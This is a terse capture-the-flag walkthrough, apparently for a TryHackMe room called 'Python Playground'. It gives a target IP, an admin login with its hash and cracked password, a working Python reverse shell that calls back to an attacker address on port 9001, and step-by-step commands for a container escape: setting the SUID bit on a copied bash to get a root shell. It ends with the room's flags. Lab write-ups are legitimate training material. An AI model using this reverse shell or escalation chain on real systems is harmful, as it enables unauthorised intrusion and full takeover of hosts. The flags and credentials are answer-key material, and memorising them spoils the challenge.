# PYTHON PLAYGROUND

## BASIC INFO
```
export IP=10.10.152.202
```

/admin
```
username:connor
hashed_pass:dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu
password:spaghetti1245
```

/super-secret-admin-testing-panel.html
reverse shell:
```python
socket = __import__('socket')
subprocess = __import__('subprocess')
os = __import('os')
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.11.7.208",9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

mount
```
/dev/xvda2 on /mnt/log type ext4 (rw,relatime,data=ordered)
```
...`/dev/xvda2` is mounted on `/mnt/log` and `/dev/xvda2` is on host machine.
Try writting a file in `/mnt/log` and see where it ends up in the host machine.
Seems like it is writting to `/var/log`. Also, it is own by root as well. Let's copy `/bin/bash` from the host machine to `/var/log` and then change it's permission and set the SUID bits on it.

```bash
#On container
chmod 777 /mnt/log
## This is to able connor to write in /var/log

#On host machine
cp /bin/bash /var/log

#On container
cd /mnt/log
chown root bash
chmod u+s ./bash

#On host machine
cd /var/log
./bash -p
```
...and now we have root shell.

THM{7e0b5cf043975e3c104a458a8d4f6f2f}
THM{69a36d6f9da10d23ca0dbfdf6e691ec5}
THM{be3adc69c25ad14eb79da4eb57925ad1}